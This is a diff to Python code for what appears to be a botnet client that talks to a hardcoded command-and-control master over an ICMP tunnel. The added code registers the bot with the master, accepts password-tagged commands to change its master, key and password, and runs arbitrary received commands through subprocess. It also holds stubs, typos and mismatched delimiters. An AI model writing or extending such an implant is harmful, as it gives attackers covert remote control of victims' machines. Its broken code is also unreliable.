@@ -1,9 +1,12 @@
 from icmp_tunnel import *
 import threading
+import os
 
+MASTER = "10.0.0.1"
 DECRYPTION_KEY = "pass123"
+PASSWORD = "OkayNowYouCanUseMe"
+WEB = "www.ILoveRed.com"
 cmdQueue = Queue.Queue()
-Files = []
 
 class Handler(threading.Thread):
     def __init__(self, q):
@@ -13,26 +16,38 @@ class Handler(threading.Thread):
     def run(self):
         while True:
             if not self.q.empty():
-
                 #BUILT IN CMD FORMAT IS AS FOLLOWS
-                #<command here> | arg1 arg2 arg3
-                #OTHERWISE COMMANDS WILL JUST BE EXECUTED VIA os.execl(command)
+                #<command here>------>arg1 arg2 arg3
+                #OTHERWISE COMMANDS WILL JUST BE EXECUTED AND THEIR OUTPUT RETURNED
+	
+		raw = self.q.get()
 
-                cmd = self.q.get()
+		if PASSWORD in raw:	#Is this legit data?
+			if "----->" in raw:	#Is this a builtin?
+				builtin = raw.strip(PASSWORD).split("----->")
+				if builtin[0] == "SET-MASTER":
+					MASTER = builtin[1]
+				elif builtin[0] == "SET-KEY":
+					DECRYPTION_KEY = builtin[1]
+				elif builtin[0] == "SET-PASS":
+					PASSWORD = builtin[1]
+				elif builtin[0] == "SET-WEB":
+					WEB = builtin[1]
+				elif builtin[0] == "RESET-EMERGENCY-OMG":
+					PASSWORD = "DEFAULT-HARDCODED"
+					DECRYPTION = "DEFAULT-DENCRYPT"
+					WEB = "www.DEFAULT.com"
+				elif builtin[0] == "EXEC":
+					sub	
+			else:
+				cmd = raw.strip(PASSWORD).split()
+				out = subprocess.check_output(cmd)
+				send_icmp(localhost, MASTER, "OUTPUT")
 
-                if cmd == "FILE-TRANSFER-START":
-                    buf = []
-                    Files.append(buf)
-                    FileReciever(buf)
-                    FileReciever.start()
-                elif cmd == "NEW-BOT-RESPONSE":#ARGS- <<OTHER DATA HERE>>
-                    pass
-                elif cmd == "RUN-FILE":#ARGS-ID
-                    pass
-                elif cmd == "SAVE-FILE":#ARGS-ID
-                    pass
-
-
+def init():
+	print("Bot started...["+localhost+"]")
+	send_icmp(localhost, MASTER, "NEW-BOT-INIT:"+localhost)
+	
 def main():
     listener = Listener(cmdQueue)
     handler = Handler(cmdQueue)
